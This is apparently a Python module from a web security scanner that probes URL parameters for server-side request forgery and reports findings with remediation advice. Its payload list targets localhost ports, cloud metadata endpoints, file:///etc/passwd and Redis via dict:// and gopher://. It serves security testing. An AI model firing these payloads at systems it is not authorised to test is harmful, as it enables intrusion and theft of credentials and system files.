import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core import Finding, Severity, ScanSession, build_curl
from scanner.log import logger

URL_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "return", "next",
    "site", "html", "data", "domain", "callback", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "navigation",
    "open", "file", "val", "validate", "link", "image", "img",
    "src", "source", "page", "proxy", "request", "fetch",
    "target", "load", "href", "resource",
]

SSRF_PAYLOADS = [
    {"payload": "http://127.0.0.1", "indicators": [r"<html", r"<title>", r"localhost", r"It works"], "desc": "Direct localhost access"},
    {"payload": "http://127.0.0.1:22", "indicators": [r"SSH-", r"OpenSSH"], "desc": "Internal port probing (SSH)"},
    {"payload": "http://127.0.0.1:3306", "indicators": [r"mysql", r"MariaDB", r"native_password"], "desc": "Internal port probing (MySQL)"},
    {"payload": "http://[::1]", "indicators": [r"<html", r"<title>"], "desc": "IPv6 localhost bypass"},
    {"payload": "http://0x7f000001", "indicators": [r"<html", r"<title>"], "desc": "Hex IP bypass"},
    {"payload": "http://0177.0.0.1", "indicators": [r"<html", r"<title>"], "desc": "Octal IP bypass"},
    {"payload": "http://169.254.169.254/latest/meta-data/", "indicators": [r"ami-id", r"instance-id", r"local-hostname", r"iam"], "desc": "AWS metadata endpoint"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/", "indicators": [r"project", r"attributes"], "desc": "GCP metadata endpoint"},
    {"payload": "http://169.254.169.254/metadata/instance", "indicators": [r"compute", r"vmId"], "desc": "Azure metadata endpoint"},
    {"payload": "file:///etc/passwd", "indicators": [r"root:.*?:0:0"], "desc": "File scheme access"},
    {"payload": "dict://127.0.0.1:6379/INFO", "indicators": [r"redis_version", r"connected_clients"], "desc": "Redis via dict:// protocol"},
    {"payload": "gopher://127.0.0.1:6379/_INFO", "indicators": [r"redis_version"], "desc": "Redis via gopher:// protocol"},
]



def _get_baseline(session: ScanSession, url: str, param: str, original: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [original or "https://www.google.com"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    resp = session.get(baseline_url)
    return resp.text if resp else ""


def _check_param(session: ScanSession, url: str, param: str, original: str):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    baseline = _get_baseline(session, url, param, original)

    for entry in SSRF_PAYLOADS:
        params[param] = [entry["payload"]]
        test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
        resp = session.get(test_url)
        if not resp:
            continue

        for indicator in entry["indicators"]:
            if re.search(indicator, resp.text, re.IGNORECASE):
                if not re.search(indicator, baseline, re.IGNORECASE):
                    severity = Severity.CRITICAL if ("169.254" in entry["payload"] or "metadata" in entry["payload"] or "file:///" in entry["payload"]) else Severity.HIGH

                    curl_cmd = build_curl(test_url)
                    session.add_finding(Finding(
                        title="Server-Side Request Forgery (SSRF)",
                        severity=severity,
                        description=(
                            f"The parameter '{param}' is vulnerable to SSRF ({entry['desc']}). "
                            f"The server makes HTTP requests to attacker-controlled URLs, allowing "
                            f"access to internal services, cloud metadata, and potentially enabling "
                            f"remote code execution via internal APIs."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {entry['payload']}\n"
                            f"Attack Type: {entry['desc']}\n"
                            f"Matched Indicator: {indicator}\n"
                            f"Test URL: {test_url}\n"
                            f"Response Status: {resp.status_code}"
                        ),
                        remediation=(
                            "1. Validate and whitelist allowed URLs/IPs.\n"
                            "2. Block access to internal networks (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).\n"
                            "3. Block cloud metadata endpoints (169.254.169.254).\n"
                            "4. Disable unused URL schemes (file://, dict://, gopher://).\n"
                            "5. Use allowlists, not denylists."
                        ),
                        url=url,
                        module="ssrf",
                        cwe="CWE-918",
                        confirmed=True,
                        location=f"URL parameter '{param}' in {parsed.path}",
                        parameter=param,
                        payload=entry["payload"],
                        request_method="GET",
                        response_status=resp.status_code,
                        curl_command=curl_cmd,
                        reproduction_steps=(
                            f"1. Open: {url}\n"
                            f"2. Set the '{param}' parameter to: {entry['payload']}\n"
                            f"3. Full URL: {test_url}\n"
                            f"4. Observe the server fetches the internal resource.\n"
                            f"5. Run: {curl_cmd}"
                        ),
                        developer_fix=(
                            f"File: Server-side code handling '{parsed.path}' that uses '{param}' to make HTTP requests.\n\n"
                            f"1. Validate URLs against an allowlist of permitted domains.\n"
                            f"2. Resolve the hostname and check the IP is not internal BEFORE making the request.\n"
                            f"3. Block private IP ranges: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16\n"
                            f"4. Disable redirects or re-validate after each redirect.\n"
                            f"  Python: import ipaddress; ip = ipaddress.ip_address(resolved); if ip.is_private: deny()"
                        ),
                        affected_component=f"HTTP client in route handler for {parsed.path}",
                        references="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery | https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                        detection_method="Injected internal URLs (127.0.0.1, 169.254.169.254 metadata, internal hostnames) into parameters likely to fetch remote resources. Checked responses for internal service signatures or cloud metadata content not present in baseline.",
                    ))
                    return

    # time-based detection fallback
    params[param] = [original or "http://www.google.com"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    baseline_times = []
    for _ in range(2):
        t0 = time.time()
        session.get(baseline_url)
        baseline_times.append(time.time() - t0)

    params[param] = ["http://10.255.255.1"]
    test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    hits = 0
    for _ in range(2):
        t0 = time.time()
        session.get(test_url)
        if time.time() - t0 > max(baseline_times) + 5:
            hits += 1

    if hits >= 2:
        session.add_finding(Finding(
            title="Potential SSRF (Time-Based)",
            severity=Severity.MEDIUM,
            description="Parameter '{}' shows consistent timing difference when targeting internal IPs, suggesting the server attempts to connect.".format(param),
            evidence="Both requests to internal IP (10.255.255.1) exceeded baseline by >5s.\nBaseline max: {:.2f}s".format(max(baseline_times)),
            remediation="Validate and whitelist allowed URLs. Block internal network access.",
            url=url,
            module="ssrf",
            cwe="CWE-918",
            confirmed=False,
            location=f"URL parameter '{param}' in {parsed.path}",
            parameter=param,
            payload="http://10.255.255.1",
            curl_command=build_curl(test_url),
            developer_fix="Validate destination URLs against an allowlist and block private IP ranges before making requests.",
            references="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            detection_method="Injected internal URLs (127.0.0.1, 169.254.169.254 metadata, internal hostnames) into parameters likely to fetch remote resources. Checked responses for internal service signatures or cloud metadata content not present in baseline.",
        ))


def run(session: ScanSession) -> None:
    logger.info("\n[*] Testing for Server-Side Request Forgery (SSRF)...")

    for url in session.crawled_urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param, values in params.items():
            if param.lower() in URL_PARAMS or any(
                kw in (values[0] if values else "").lower()
                for kw in ["http", "://", "www", ".com", ".org"]
            ):
                _check_param(session, url, param, values[0] if values else "")

    for url in list(session.crawled_urls)[:5]:
        parsed = urlparse(url)
        if parsed.query:
            continue
        for param in URL_PARAMS[:3]:
            _check_param(session, url + f"?{param}=test", param, "test")
